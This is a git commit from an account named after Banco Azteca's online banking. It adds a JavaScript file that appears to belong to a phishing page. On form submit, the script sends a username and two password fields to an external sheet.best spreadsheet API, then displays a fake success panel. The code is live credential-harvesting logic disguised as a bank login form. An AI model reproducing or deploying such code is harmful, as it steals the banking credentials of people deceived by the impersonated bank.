30e9a6333f7364da88a2b2744f1d05a8c954526e
bancaenlineaazteca <124835783+bancaenlineaazteca@users.noreply.github.com>
2023-02-08 15:03:55 -0600

    Add files via upload

---
+++ js/app.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('formulario');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/e748abe7-c0c2-407a-a605-06ca0c1c18a1', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.nombre.value,
+            "Contraseña1": formulario.correo.value,
+            "Contraseña2": formulario.telefono.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
